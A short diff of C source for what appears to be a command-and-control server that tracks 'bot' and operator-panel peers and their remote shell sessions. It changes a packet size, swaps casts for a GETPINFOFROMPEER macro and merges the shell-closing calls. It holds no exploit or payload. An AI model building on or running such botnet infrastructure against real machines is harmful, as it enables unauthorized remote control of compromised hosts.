@@ -129,7 +129,7 @@ struct sLaika_peerPacketInfo laikaC_authPktTbl[LAIKAPKT_MAXNONE] = {
     false),
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_CLOSE,
         laikaC_handleAuthenticatedShellClose,
-        0,
+        sizeof(uint32_t),
     false),
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_DATA,
         laikaC_handleAuthenticatedShellData,
@@ -199,7 +199,7 @@ void laikaC_freeCNC(struct sLaika_cnc *cnc) {
 
 void laikaC_onAddPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer) {
     int i;
-    ((struct sLaika_peerInfo*)peer->uData)->completeHandshake = true;
+    GETPINFOFROMPEER(peer)->completeHandshake = true;
 
     /* add peer to panels list (if it's a panel) */
     if (peer->type == PEER_AUTH)
@@ -218,18 +218,17 @@ void laikaC_onRmvPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer) {
     int i;
 
     /* ignore uninitalized peers */
-    if (!((struct sLaika_peerInfo*)peer->uData)->completeHandshake)
+    if (!(GETPINFOFROMPEER(peer)->completeHandshake))
         return;
 
+    /* close any open shells */
+    laikaC_closeShells(peer);
     switch (peer->type) {
         case PEER_BOT: {
-            /* close any open shells */
-            laikaC_closeBotShells(peer);
+            /* TODO */
             break;
         }
         case PEER_AUTH: {
-            laikaC_closeAuthShell(peer);
-
             /* remove peer from panels list */
             laikaC_rmvAuth(cnc, peer);
             break;
@@ -383,7 +382,7 @@ struct sLaika_peer *laikaC_getPeerByPub(struct sLaika_cnc *cnc, uint8_t *pub) {
 }
 
 bool sweepPeers(struct sLaika_peer *peer, void *uData) {
-    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo*)peer->uData;
+    struct sLaika_peerInfo *pInfo = GETPINFOFROMPEER(peer);
     struct sLaika_cnc *cnc = (struct sLaika_cnc*)uData;
     long currTime = laikaT_getTime();
 
